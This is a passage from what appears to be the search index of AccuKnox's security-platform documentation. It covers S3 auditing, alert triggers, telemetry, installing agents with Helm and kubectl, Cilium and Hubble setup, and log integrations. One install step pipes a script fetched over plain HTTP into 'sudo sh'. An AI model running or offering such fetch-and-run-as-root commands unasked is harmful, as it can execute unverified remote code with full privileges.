AccuKnox S3 Audit Reporter </p> <p><code>unzip aks3r.zip -d aks3r</code></p> <p>Edit the conf/buckets.yaml</p> <p>Configure the buckets to be monitored</p> <p>Add the workspace</p> <p>Add the apiToken</p> <p>The app.yaml and buckets.yaml files must be present inside conf/ folder.</p> <p>Run AccuKnox S3 Audit Reporter</p> <p><code>./asar &gt; /dev/null 2&gt;&amp;1 &amp;</code></p>"},{"location":"data-protection/s3/setup-and-configure/","title":"Setup and configure","text":"<p>In order to setup AccuKnox S3 Access Audit perform the following steps:</p> <ol> <li> <p>Visit AccuKnox Platform</p> </li> <li> <p>Login using the email and password.</p> </li> <li> <p>Select or create a new workspace</p> </li> <li> <p>On the left navigation pane, select Data Protection</p> </li> <li> <p>Next, select Data Sources</p> </li> <li> <p>Click on the Configure Data Source button at the top right corner</p> </li> <li> <p>Choose No for Is the s3 bucket mounted inside a container workload?</p> </li> <li> <p>Choose No for Is your S3 access log buckets accessible from outside your private network?</p> </li> <li> <p>In our scenario, we do not have S3 bucket objects accessible from outside the private network, hence click on Done.</p> </li> <li> <p>Follow the steps here to install the AccuKnox S3 Audit Reporter Agent.</p> </li> <li> <p>Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with AccuKnox Platform. </p> </li> <li> <p>Now, on the left navigation pane, under Data Protection, click on Sensitive Source Labels</p> </li> <li> <p>Enter a value for Label.</p> </li> <li> <p>Under S3 BUCKET on the left, select the bucket you want to configure sensitive sources from and select the objects that are sensitive on the right.</p> </li> <li> <p>Click on Next.</p> </li> <li> <p>We can skip the Configure Flagged Destination step.</p> </li> <li> <p>Review the selection and click on Create.</p> </li> </ol>"},{"location":"extensions/code-hilite/","title":"CodeHilite","text":"<ul> <li>CodeHilite - Material for MkDocs</li> <li>Supported languages - Pygments</li> </ul>"},{"location":"extensions/code-hilite/#configure-mkdocsyml","title":"Configure <code>mkdocs.yml</code>","text":"<pre><code>markdown_extensions:\n  - codehilite\n</code></pre>"},{"location":"extensions/footnote/","title":"Footnote","text":"<ul> <li>Footnotes - Material for MkDocs</li> </ul>"},{"location":"extensions/footnote/#configure-mkdocsyml","title":"Configure <code>mkdocs.yml</code>","text":"<pre><code>markdown_extensions:\n  - footnotes\n</code></pre>"},{"location":"extensions/footnote/#example","title":"Example","text":"<ul> <li>Footnote example 1.1</li> <li>Footnote example 2.2</li> </ul> <ol> <li> <p>One line\u00a0\u21a9</p> </li> <li> <p>First line Second line\u00a0\u21a9</p> </li> </ol>"},{"location":"extensions/mathjax/","title":"MathJax","text":"<ul> <li>PyMdown - Material for MkDocs</li> </ul>"},{"location":"extensions/mathjax/#configure-mkdocsyml","title":"Configure <code>mkdocs.yml</code>","text":"<pre><code>markdown_extensions:\n    - mdx_math:\n        enable_dollar_delimiter: True\n</code></pre>"},{"location":"extensions/mathjax/#example-code","title":"Example code","text":"<pre><code>$$\nP\\cdot Q = \\|P\\|\\|Q\\|\\cos\\alpha\n$$\n</code></pre>"},{"location":"extensions/mathjax/#example-rendering","title":"Example rendering","text":"\\[ P\\cdot Q = \\|P\\|\\|Q\\|\\cos\\alpha \\]"},{"location":"getting-started/Logs/","title":"Logs","text":""},{"location":"getting-started/Logs/#logs-and-triggers","title":"Logs and Triggers","text":""},{"location":"getting-started/Logs/#1-what-kind-of-logs","title":"1. What Kind of Logs:","text":"<ul> <li>The logs generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed under Logs section.</li> <li>The logs can be viewed for independent workloads like K8's or VM's</li> </ul> <p>Each of the component should be up and Running in the installed cluster for the logs to be seen in the Workspace.</p> <p>NOTE: It's assumed that All Agents is running on cluster if not kindly go through this section</p>"},{"location":"getting-started/Logs/#2-triggers","title":"2. Triggers:","text":"<ul> <li>An Alert trigger is a rule which triggers information transfer through a known channel. Customer can send information [log] in Real Time when it occurs or on specified Frequency.</li> <li>Frequency is configurable which can be Once In a Day/ Week / Month.</li> <li>Predefined Filters (or) pre-saved global filters are search queries on logs that is already available in the system.</li> <li>Example : show logs for traffic direction = \"EGRESS\"</li> </ul>"},{"location":"getting-started/Logs/#3-configuration-of-alert-triggers","title":"3. Configuration of Alert Triggers:","text":"<ul> <li>On the Logs page, after choosing specific log filter click on 'Create Trigger' button.</li> <li>The below fields needs to be entered with appropriate data:</li> <li>Name: Enter the name for the trigger. You can set any name without special characters.</li> <li>When to Initiate: The frequency of the trigger as Real Time / .</li> <li>Status: Enter the severity for the trigger.</li> <li>Search Filter Data : The filter log chosen in automatically populated here.This is optional.</li> <li>Predefined queries: The list of predefined queries for this workspace is shown as default.</li> <li>Notification Channel: Select the integration channel that needs to receive logs. Can be Slack/ Splunk / Cloudwatch / Elastic. (Note: Channel Integrations needs to be done beforehand)</li> <li>Save: Click on Save for the trigger to get stored in database.</li> </ul>"},{"location":"getting-started/Logs/#a-list-of-triggers","title":"a. List Of Triggers:","text":"<ul> <li>Select Triggers from the left navigation to view the list of triggers created. <p>(If Default params needs to be modified)</p> </li> <li>The below fields for each trigger can be viewed.</li> <li>Alert Trigger : Name of the Trigger</li> <li>Created At    : Time of Trigger Creation</li> <li>Channel       : Integration Channel Name</li> <li>Enable/Disable: Enabling / Disabling the trigger to forward the logs into Integration Channel.</li> <li>Details       : The filter query of the associated Trigger.</li> </ul>"},{"location":"getting-started/Logs/#b-actions","title":"b. Actions:","text":"<ul> <li>Select the below Actions on the triggers to check working of logs forwarding. <p>(If Default params needs to be modified)</p> </li> <li>The below actions for each trigger can be selected.</li> <li>Enable        : Enabling the trigger to forward the logs into Integration Channel.</li> <li>Disable       : Disabling the trigger to not forward the logs into Integration Channel.</li> <li>Delete        : Delete the Logs Trigger</li> <li>Export        : Exporting the triggers in PDF format.</li> </ul>"},{"location":"getting-started/Logs/#4-logs-forwarding","title":"4. Logs Forwarding:","text":"<ul> <li>For each Enabled Trigger, please check the integrated channel to view the logs.</li> <li>The Rule Engine matches the real time logs against the triggers created.</li> <li>Frequency &gt;&gt; Real Time</li> <li>The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel as it happens.</li> <li>Frequency &gt;&gt; Once in A Day</li> <li>The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Day.</li> <li>Frequency &gt;&gt; Once in A Month</li> <li>The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Month.</li> <li>Frequency &gt;&gt; Once in A Week</li> <li>The Network (OR) System (OR) S3 (OR) Data protection (OR) Anamoly Detection Logs in Real Time can be seen in integrated Channel only Once in a Week.</li> </ul> <p>NOTE: Frequency reduces channel noise / and safely provides only one informational log on the channels based on frequency time period.</p>"},{"location":"getting-started/Telemetry/","title":"Telemetry","text":"<p>A Telemetry in Accuknox is tool for visually tracking, analyzing, and displaying key performance metrics, which enable you to monitor the health of your workspace. The metrics generated from each component like Network / System / Data Protection / Anamoly Detection can be viewed in Telemetry Section.</p>"},{"location":"getting-started/Telemetry/#select-workloads","title":"Select Workloads","text":"<p>Select between available workloads like Virtual Machine or Kubernetes Cluster, whatever is onboarded to your workspace. Each workload have four different components with predefined metrics.</p> <ul> <li>You can navigate between the Clusters and Instance Group and Instances Accordingly.</li> <li>Kubernetes Clsuters dropdown lets user filter the data from each Individual clusters, similarly for VM you can filter the data from Insances group to Instances name.</li> </ul>"},{"location":"getting-started/Telemetry/#select-components","title":"Select Components","text":"<ol> <li>System: Select the available component to check the metrics of for each. You can select System to view the metrics generated from KubeArmor logs.  You can select the available filters from each graph to view the metrics from available Hosts, Pods, Namespaces, and Containers. </li> <li>Network: Network logs shows the metrics generated from Cilium logs.</li> <li>Data Protection: Data Protection Metrics shows the metrics generated from the logs of your onboarded databases like MySQL, SQLlite and other DataSources like Amazon S3.</li> <li>Anomaly Detection: Anomaly Detection Telemetries shows the metrics from the logs collected from Trained Container. </li> </ol> <p>Note: To view above metrics on the Telemetry Screen make sure the rescpective agents are installed on the onboarded cluster or VM. Steps for Agent Installations, Know more.</p>"},{"location":"getting-started/Telemetry/#graph-filters","title":"Graph Filters","text":"<p>Each graph contains multiple metrics, you can filter the data for each graph to watch and compare the metrics for each filters available.</p>"},{"location":"getting-started/Telemetry/#select-timestamp","title":"Select Timestamp","text":"<p>You can select the time range for the metrics which you want to see form Last 5 minutes to Last 60 Days.</p>"},{"location":"getting-started/accuknox-agents/","title":"AccuKnox Agents","text":""},{"location":"getting-started/accuknox-agents/#accuknox-agents-description","title":"AccuKnox Agents Description","text":"Accuknox core agents Description KubeArmor This agent is used to apply system level policies. Cilium This agent is used to apply network level policies. Shared Informer Agent This agent authenticates with your cluster and collects information regarding entities like Nodes, Pods, Namespaces. Feeder Service Feeder service deployment that collects feeds from Kubearmor and Cilium. Policy Enforcement This agent authenticates with your cluster and enforces label and policy. Discovery Engine Agent Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture"},{"location":"getting-started/accuknox-agents/#supported-platforms","title":"Supported platforms","text":"Deployments Deployment Type Supported version  (Kubernetes) KubeArmor DaemonSet EKS Ubuntu Server 20.04,  Minikube Cluster,  MicroK8's Cluster,  K3's Cluster,  GKE with COS and Ubuntu,  EKS Amazon Linux 2 Shared Informer Agent DaemonSet EKS Ubuntu Server 20.04,  Minikube Cluster,  MicroK8's Cluster,  K3's Cluster,  GKE with COS and Ubuntu,  EKS Amazon Linux 2 Feeder Service ReplicaSet EKS Ubuntu Server 20.04,  Minikube Cluster,  MicroK8's Cluster,  K3's Cluster,  GKE with COS and Ubuntu,  EKS Amazon Linux 2 Policy Enforcement DaemonSet EKS Ubuntu Server 20.04,  Minikube Cluster,  MicroK8's Cluster,  K3's Cluster,  GKE with COS and Ubuntu,  EKS Amazon Linux 2 Discovery Engine Agent DaemonSet EKS Ubuntu Server 20.04,  Minikube Cluster,  MicroK8's Cluster,  K3's Cluster,  GKE with COS and Ubuntu,  EKS Amazon Linux 2 <ul> <li> <p>It is assumed that the user has some basic familiarity with Kubernetes, kubectl and helm. It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to AccuKnox itself, refer first to Getting Started.</p> </li> <li> <p>It is recommended to have the following configured before onboarding:</p> </li> <li> <p>Kubectl</p> </li> <li>Helm</li> </ul>"},{"location":"getting-started/accuknox-agents/#pre-requisites","title":"Pre-requisites","text":""},{"location":"getting-started/accuknox-agents/#minimum-resource-required","title":"Minimum Resource required","text":"<p>A Kubernetes cluster with</p> <ul> <li>Number of Nodes : 3</li> <li>Machine Type: e2-standard-2    </li> <li>Total vCPUs : 6</li> <li>Total Memory: 24GB</li> </ul> Deployments Resource usage KubeArmor CPU: 100 m, Memory: 20 Mi Shared Informer Agent CPU: 500 m, Memory: 750 Mi Feeder Service CPU: 1, Memory: 500 Mi Policy Enforcement CPU: 200 m, Memory: 800 M Ports Description 9093, 443, 80 The worker cluster will communicate with accuknox SaaS and general internet"},{"location":"getting-started/accuknox-agents/#agents-installations","title":"Agents Installations","text":"<ol> <li>Create Namespace <pre><code> kubectl create namespace accuknox-agents\n</code></pre></li> <li>Adding AccuKnox Helm repository.  Required incase of installing by Helm</li> <li>Add AccuKnox repository to install agents helm package. <pre><code>helm repo add accuknox-agents https://accuknox-agents:xxxxxxxxxxxxxxx@agents.accuknox.com/repository/accuknox-agents\n</code></pre> <p>Note: \"accuknox-agents\" keys will be unique and provided through accuknox saas platform.</p> </li> <li>Once repository added successfully, update the helm repository. <pre><code>helm repo update\n</code></pre></li> </ol>"},{"location":"getting-started/accuknox-agents/#1-cilium","title":"1. Cilium","text":"<p>This agent is used to apply network policies.</p> <p>Installation Guide</p> <ol> <li>Download Cilium CLI. <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre></li> <li>Install Cilium. <pre><code>cilium install\n</code></pre></li> <li>Enable Hubble in Cilium. <pre><code>cilium hubble enable\n</code></pre></li> </ol>"},{"location":"getting-started/accuknox-agents/#2-kubearmor","title":"2. KubeArmor","text":"<p>This agent is used to apply system level policies.</p> <p>Installation Guide</p> <ol> <li>Download and install Karmor CLI. <pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n</code></pre></li> <li>Install KubeArmor. <pre><code>karmor install\n</code></pre></li> </ol>"},{"location":"getting-started/accuknox-agents/#3-feeder-service","title":"3. Feeder Service","text":"<p>Feeder service deployment that collects feeds from Kubearmor and Cilium.</p> <p>Installation Guide</p> <ol> <li>To Install agents on destination cluster. <pre><code> helm upgrade --install feeder-service  accuknox-agents/feeder-service-chart -n accuknox-agents\n</code></pre></li> <li>Set the env of Feeder Service. <pre><code> kubectl set env deploy/feeder-service tenant_id=241 cluster_id=427 cluster_name=prod-cluster-onboarding -n accuknox-agents\n</code></pre> <p>Note: <code>tenant_id</code> and <code>cluster_id</code> will be unique from user to user, replace it with your <code>tenant_id</code> and <code>cluster_id</code>.</p> </li> </ol>"},{"location":"getting-started/accuknox-agents/#4-shared-informer-agent","title":"4. Shared Informer Agent","text":"<p>This agent authenticates with your cluster and collects information regarding entities like nodes, pods, namespaces.</p> <p>Installation Guide</p> <p>1.To Install agents on destination cluster. <pre><code>helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents\n</code></pre></p>"},{"location":"getting-started/accuknox-agents/#5-policy-enforcement-agent","title":"5. Policy Enforcement Agent","text":"<p>This agent authenticates with your cluster and enforces label and policy.</p> <p>Installation Guide</p> <ol> <li>To Install agents on destination cluster. <pre><code>helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents\n</code></pre></li> <li>Set the env of policy-enforcement-agent.</li> </ol> <pre><code>kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id=241 cluster_name=prod-cluster-onboarding\n</code></pre> <p>Note: <code>workspace_id</code> and <code>cluster_name</code> will be unique from user to user, replace it with your <code>workspace_id</code> and <code>cluste_name</code>.</p>"},{"location":"getting-started/accuknox-agents/#6-discovery-engine-agent","title":"6. Discovery Engine Agent","text":"<p>Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture.</p> <p>Installation Guide</p> <ol> <li>To Install agent on the destination cluster. <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/discovery-engine/dev/deployments/k8s/deployment.yaml -n accuknox-agents\n</code></pre></li> <li>Set the env of policy-enforcement-agent. <pre><code>kubectl set env deploy/knoxautopolicy -n accuknox-agents workspace_id=147 cluster_name=accuknox-e2e-01\n</code></pre> <p>Note: <code>workspace_id</code> and <code>cluster_name</code> will be unique from user to user, replace your <code>workspace_id</code> and <code>cluster_name</code>.</p> </li> </ol>"},{"location":"getting-started/agent-metrics/","title":"Agent metrics","text":""},{"location":"getting-started/agent-metrics/#agent-metrics-filebeat-kibana-on-prem-metrics","title":"Agent Metrics: FileBeat | Kibana | On-prem Metrics","text":""},{"location":"getting-started/agent-metrics/#1-status-of-feeder-agent-running-on-cluster","title":"1. Status of Feeder Agent running on Cluster:","text":"<p>Please run the below command to check if agent and dependent pods are up and running. <pre><code>kubectl get all \u2013n feeder-service\n</code></pre> All the pods/services should be in Running state.</p> <p>NOTE: It's assumed that Feeder Agent is running on cluster if not kindly go through this section</p>"},{"location":"getting-started/agent-metrics/#2-beats-setup","title":"2. Beats Setup:","text":"<ul> <li>The agent will be spinned along with Filebeat running along as a sidecar.</li> <li>The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana.</li> </ul>"},{"location":"getting-started/agent-metrics/#a-elastic-configuration-parameters","title":"a. Elastic Configuration Parameters:","text":"<ul> <li>The below Configuration parameters can be updated for elastic configuration. <p>(If Default params needs to be modified) <pre><code> - name: ELASTICSEARCH_HOST\nvalue: https://elasticsearch-es-http\n- name: ELASTICSEARCH_PORT\nvalue: \"9200\"\n- name: ELASTICSEARCH_USERNAME\nvalue: \"elastic\"\n- name: ELASTICSEARCH_PASSWORD\nvalue: \"xxxxxxxxxxxxx\"\n</code></pre></p> </li> </ul>"},{"location":"getting-started/agent-metrics/#b-command-to-be-used","title":"b. Command to be Used:","text":"<pre><code>kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST=\u201dhttps://elasticsearch-es-http\u201d\n</code></pre>"},{"location":"getting-started/agent-metrics/#c-update-log-path","title":"c. Update Log Path:","text":"<ul> <li>To Update the Log path configured, please modify the below log input path under file beat inputs. <pre><code>filebeat.inputs:\n- type: container\npaths:\n- /log_output/value.log\n</code></pre></li> </ul>"},{"location":"getting-started/agent-metrics/#2-kibana-dashboard","title":"2. Kibana Dashboard","text":"<ul> <li>Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen.</li> <li>In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this<ol> <li>One called Visualize and</li> <li>Another called Dashboard</li> </ol> </li> <li>In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.</li> </ul>"},{"location":"getting-started/agent-metrics/#3-metrics","title":"3. Metrics:","text":"<ul> <li>Once the feeder agent starts running, check the logs using below command <pre><code>Kubectl logs \u2013f podname \u2013n feeder-service\n</code></pre></li> <li>The logs will push the metric data to GRPC Client / Kafka, and the GRPC server in SaaS platform will be listening to this metrics and can be viewed in Prometheus. <p>(prometheus-dev.accuknox.com)</p> </li> </ul>"},{"location":"getting-started/agent-metrics/#4-on-prem-metrics","title":"4. On Prem Metrics:","text":"<ul> <li>To fetch the metrics in standalone environment, please write a scrape job in Prometheus with feeder service agent as a job name, and scrape the metrics from port (:xxxx) <pre><code>- job_name: \"feeder-pod-agent\"\nsample_limit: 10000\n</code></pre></li> </ul>"},{"location":"getting-started/channel-integration/","title":"Channel integration","text":""},{"location":"getting-started/channel-integration/#channel-integration","title":"Channel Integration","text":"<p>Channel Integrations is the fourth sub-section of Workspace Manager.</p> <p>This section is used to integrate external services with AccuKnox so you can export logs as well as metrics. These services include:</p> <ol> <li>Slack</li> <li>Elastic Search</li> <li>Splunk</li> <li>AWS CloudWatch </li> <li>Jira</li> <li>Pagerduty</li> <li>Webhooks</li> <li>Syslog</li> <li>Email</li> <li>ServiceNow </li> </ol> <p>Choose any one of the services and click the  Integrate Now  button.</p>"},{"location":"getting-started/cilium-install/","title":"Cilium: Deployment Guide","text":""},{"location":"getting-started/cilium-install/#deployment-steps-for-cilium-hubble-cli","title":"Deployment Steps for Cilium &amp; Hubble CLI","text":""},{"location":"getting-started/cilium-install/#1-download-and-install-cilium-cli","title":"1. Download and install Cilium CLI","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"getting-started/cilium-install/#2-install-cilium","title":"2. Install Cilium","text":"<p><pre><code>cilium install\n</code></pre> It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.</p>"},{"location":"getting-started/cilium-install/#3-validate-the-installation","title":"3. Validate the Installation","text":""},{"location":"getting-started/cilium-install/#a-optional-to-validate-that-cilium-has-been-properly-installed-you-can-run","title":"a. [Optional] To validate that Cilium has been properly installed, you can run:","text":"<pre><code>cilium status --wait\n</code></pre>"},{"location":"getting-started/cilium-install/#b-optional-run-the-following-command-to-validate-that-your-cluster-has-proper-network-connectivity","title":"b. [Optional] Run the following command to validate that your cluster has proper network connectivity:","text":"<p><pre><code>cilium connectivity test\n</code></pre> Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89</p>"},{"location":"getting-started/cilium-install/#4-setting-up-hubble-observability","title":"4. Setting up Hubble Observability","text":""},{"location":"getting-started/cilium-install/#a-enable-hubble-in-cilium","title":"a. Enable Hubble in Cilium","text":"<pre><code>cilium hubble enable\n</code></pre>"},{"location":"getting-started/cilium-install/#b-install-the-hubble-cli-client","title":"b. Install the Hubble CLI Client","text":"<pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\ncurl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check hubble-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\nrm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"getting-started/cilium-install/#5-getting-alertstelemetry-from-cilium","title":"5. Getting Alerts/Telemetry from Cilium","text":""},{"location":"getting-started/cilium-install/#a-enable-port-forwarding-for-cilium-hubble-relay","title":"a. Enable port-forwarding for Cilium Hubble relay","text":"<pre><code>cilium hubble port-forward&amp;\n</code></pre>"},{"location":"getting-started/cilium-install/#b-observing-logs-using-hubble-cli","title":"b. Observing logs using hubble cli","text":"<pre><code>hubble observe\n</code></pre>"},{"location":"getting-started/cloudwatch-integration/","title":"CloudWatch","text":""},{"location":"getting-started/cloudwatch-integration/#aws-cloudwatch-integration","title":"AWS CloudWatch Integration","text":"<p>Channel Integrations is the fourth sub-section of Workspace Manager.</p> <p>This section is used to integrate external services with AccuKnox and export logs based on triggers.</p> <ol> <li>AWS CloudWatch</li> </ol> <p>Choose \"AWS CloudWatch\" services and click the Integrate Now button.</p>"},{"location":"getting-started/cloudwatch-integration/#1-integration-of-amazon-cloudwatch","title":"1. Integration of Amazon CloudWatch:","text":""},{"location":"getting-started/cloudwatch-integration/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li>AWS Access Key / AWS Secret Key is required for this Integration.</li> <li>[Note]: Please refer this link to create access keys link</li> </ul>"},{"location":"getting-started/cloudwatch-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Goto Channel Integration URL</li> <li>Click the Integrate Now button -&gt; AWS CloudWatch</li> <li>Here you'll be able to see these entries:<ul> <li>Integration Name: Enter the name for the integration. You can set any name.</li> <li>AWS Access Key: Enter your AWS Access Key here.</li> <li>AWS Secret Key: Enter your AWS Secret Key here.</li> <li>Region Name: Enter your AWS Region Name here.</li> </ul> </li> <li>Once you fill every field then click the button this will test whether your integration is working or not.</li> <li>Click the Save button.</li> </ul>"},{"location":"getting-started/cloudwatch-integration/#2-configuration-of-alert-triggers","title":"2. Configuration of Alert Triggers:","text":"<ul> <li>On the Logs page, after choosing specific log filter click on 'Create Trigger' button.</li> <li>The below fields needs to be entered with appropriate data:</li> <li>Name: Enter the name for the trigger. You can set any name without special characters.</li> <li>When to Initiate: The frequency of the trigger as Real Time / .</li> <li>Status: Enter the severity for the trigger.</li> <li>Search Filter Data : The filter log chosen in automatically populated here.This is optional.</li> <li>Predefined queries: The list of predefined queries for this workspace is shown as default.</li> <li>Notification Channel: Select the integration channel that needs to receive logs. This should be AWS CloudWatch. (Note: Channel Integration is done on the previous step)</li> <li>Save: Click on Save for the trigger to get stored in database.</li> </ul>"},{"location":"getting-started/cloudwatch-integration/#3-logs-forwarding","title":"3. Logs Forwarding:","text":"<ul> <li>For each Enabled Trigger, please check the AWS platform to view the logs.</li> <li>Based on Frequency (Real Time / Once in a Day / Week)</li> <li>The Rule Engine matches the real time logs against the triggers created.</li> </ul>"},{"location":"getting-started/cluster-management/","title":"Cluster discovery and management","text":"<p>The cluster manager provides visualization of the clusters after automatically discovering them from your K8s cluster.</p> <p>In the case of Virtual Machines, the cluster manager shows the list of Virtual Machine instances discovered.</p>"},{"location":"getting-started/docker/","title":"Start with Docker","text":""},{"location":"getting-started/docker/#public-docker-image","title":"Public docker image","text":"<ul> <li>Package peaceiris/mkdocs-material</li> </ul>"},{"location":"getting-started/docker/#docker-compose","title":"docker-compose","text":"<p>Here is an example docker-compose.yml Please check the latest tag before you go.</p> <pre><code>docker-compose up\n</code></pre> <p>Go to http://localhost:8000/</p>"},{"location":"getting-started/elastic-integration/","title":"Elastic","text":""},{"location":"getting-started/elastic-integration/#elastic-search-integration","title":"Elastic Search Integration","text":"<p>Elasticsearch is an open-source, distributed, document storage and search engine that stores and retrieves data structures in near real-time. Elasticsearch represents data in the form of structured JSON documents and makes full-text search accessible via RESTful API and web clients for languages like PHP, Python, and Ruby. It\u2019s also elastic in the sense that it\u2019s easy to scale horizontally\u2014simply add more nodes to distribute the load.</p>"},{"location":"getting-started/elastic-integration/#integration-of-elasticsearch-elk-stack","title":"Integration of Elasticsearch (ELK Stack):","text":""},{"location":"getting-started/elastic-integration/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li>ElasticSearch Host / ELK should be up and running for this Integration.</li> <li>Please refer this link to deploy ELK stack inyour enviornment link.</li> </ul>"},{"location":"getting-started/elastic-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on Elastic Search</li> <li> <p>Enter the following details to configure Elastic Search.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>Test Elastic</code></li> <li>ELastic Host: Enter the ElastiSearch Host Name. e.g., <code>http://elasticsearch.organisation.com/</code></li> <li>Username : Enter your Elastic Search username created while deploying the ELK stack .e.g., <code>elasticxxxx</code></li> <li>Password: Enter the password for the same ELK deployment. e.g., <code>elasticxxxx</code></li> <li>Mount Path: Enter your logs mount path that will be passed to FileBeat as input. e.g., <code>/path/log/var</code></li> <li>Index Name: Optional field to specify the particluar index to search the pushed logs to elastic using the index name.  e.g., <code>main</code></li> <li>Index Type:Optional field to specify the log type being pushed to elastic. e.g., <code>_json</code></li> </ul> </li> <li> <p>Click  Test  to check if the entered details are being validated, If you receive Test Successful, you have entered a valid Elastic credentials.</p> </li> <li> <p>Click Save to save the Integration.</p> </li> </ul>"},{"location":"getting-started/fine-grained-access-control/","title":"Fined grained access control","text":""},{"location":"getting-started/fine-grained-access-control/#what-is-fine-grained-access-control","title":"What is Fine-Grained Access Control?","text":"<p>Fine-grained access control refers to the process of limiting who has access to certain data. Fine-grained access control employs more subtle and changeable ways for authorizing access than generic data access control, also known as coarse-grained access control. Fine-grained access control is most commonly employed in cloud computing, where a large number of endpoints are kept simultaneously. Each item has its own set of access policies. These requirements might be based on a variety of variables, such as the job of the person/process requesting access and the planned use of the entity. One person/process may be permitted to edit and alter it, while another is just permitted to view it.</p>"},{"location":"getting-started/fine-grained-access-control/#why-is-fine-grained-access-control-important","title":"Why is Fine-Grained Access Control Important?","text":"<p>The capacity to store vast volumes of data collectively is a significant competitive advantage in cloud computing. However, when it comes to data security compliance rules and regulations pertaining to customer data or financial information, this data might vary in nature, source, and security level.</p> <p>When data types may be stored independently and certain data types can simply be assigned based on storage location (e.g., Process A can access X folder, Process B can access Y folder, etc.) as in on-premises setups, coarse-grained access control may function. Fine-grained access control is critical when data is stored together in the cloud because it allows data with varied access needs to 'live' in the same storage area without causing security or compliance difficulties.</p>"},{"location":"getting-started/fine-grained-access-control/#how-accuknox-provide-fine-grained-access-controls","title":"How AccuKnox provide Fine-Grained Access Controls?","text":"<p>Accuknox provides fine-grained access control for workloads at runtime allowing SecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the SecOps can create runtime policies to make sure an always verify, never trust, zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads: -   File access - A typical file access by a process or a network can be allowed or denied on specific paths</p> <ul> <li> <p>Process execution - The ability to allow or deny a Process execution or  forking can be achieved for specific processes or all the processes on a directory</p> </li> <li> <p>Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed.</p> </li> <li> <p>Capabilities - A workload can share the capabilities of the host if and when allowed.  Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host os. </p> </li> </ul>"},{"location":"getting-started/how-is-this-help-organized/","title":"How is this help organized","text":""},{"location":"getting-started/how-is-this-help-organized/#how-this-help-is-organized","title":"How this help is organized","text":"<p>Accuknox's help documentation is divided into the following sections</p> <p>Getting started: This section helps you with basic concepts like what is runtime security, what are the basic concepts and the technology behind </p> <p>Open source: This section helps you to follow through a simple user journey that allows you to setup our open source runtime security tools in minutes on your cluster</p> <p>Accuknox cloud: This section deals with the setup of your workload on Accuknox SAAS cloud, its various features and more.</p> <p>Enterprise on prem: This section deals with how you can setup Accuknox's enterprise offering on your private cloud.</p>"},{"location":"getting-started/jira-integration/","title":"Jira","text":""},{"location":"getting-started/jira-integration/#jira-integration","title":"Jira Integration","text":"<p>Integrate AccuKnox with Jira and receive AccuKnox alert notifications in your Jira accounts. With this integration, you can automate the process of generating Jira tickets with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your Jira administrator and gather the inputs needed to enable communication between AccuKnox and Jira.</p>"},{"location":"getting-started/jira-integration/#integration-of-jira","title":"Integration of JIRA:","text":""},{"location":"getting-started/jira-integration/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li>You need a Jira Site URL , Email, UserID &amp; API token, Project key for this integration.</li> <li>To create JIRA token go to https://id.atlassian.com/manage-profile/security/api-tokens, and click on create API token.</li> </ul>"},{"location":"getting-started/jira-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on 